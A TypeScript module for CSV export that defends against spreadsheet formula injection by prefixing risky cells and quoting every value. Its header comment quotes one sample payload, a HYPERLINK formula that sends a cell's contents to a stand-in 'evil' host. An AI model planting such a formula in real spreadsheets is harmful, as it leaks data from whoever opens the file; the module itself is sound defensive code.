/**
 * CSV — the ONE way this product writes a spreadsheet file.
 *
 * Two things every hand-rolled builder got wrong at least once:
 *
 *  • FORMULA INJECTION. A cell that starts with `=`, `+`, `-`, `@`, a tab or a
 *    carriage return is run as a formula by Excel / LibreOffice / Sheets. A
 *    client named `=HYPERLINK("http://evil/?"&A1,"Click")` or a note typed by a
 *    member becomes live code on the office PC that opens the export. Such a
 *    cell is prefixed with `'`, which every spreadsheet reads as "text".
 *  • QUOTING. Every cell — the header row included — is quoted and its inner
 *    quotes doubled, so a comma, a quote or a newline inside a value can never
 *    shift a column.
 *
 * Browser-safe and Node-safe: no imports.
 */

/** Characters that make a spreadsheet treat a cell as a formula. */
const FORMULA_START = /^[=+\-@\t\r]/;

/**
 * One cell, escaped and quoted. null/undefined are an empty cell.
 *
 * A real NUMBER (typeof number/bigint) is written as itself: `-5` from a
 * number cannot be a formula, and prefixing it would turn every negative
 * balance in an export into text. Text that merely looks like `-5` is still
 * prefixed — it is text, and text is where the injection comes from.
 */
export function csvCell(value: unknown): string {
  let s = value == null ? '' : String(value);
  const isNumber = (typeof value === 'number' && Number.isFinite(value)) || typeof value === 'bigint';
  if (!isNumber && FORMULA_START.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
}

/** A column: what heads it, and how to read a row's value for it. */
export interface CsvColumn<T> {
  header: string;
  value: (row: T) => unknown;
}

/**
 * A whole file: a header row, then one line per row.
 *
 * Lines are joined with CRLF (RFC 4180) — Excel on Windows reads it, and every
 * other reader accepts it.
 */
export function toCsv<T>(rows: readonly T[], columns: readonly CsvColumn<T>[]): string {
  const head = columns.map((c) => csvCell(c.header)).join(',');
  const lines = rows.map((r) => columns.map((c) => csvCell(c.value(r))).join(','));
  return [head, ...lines].join('\r\n');
}
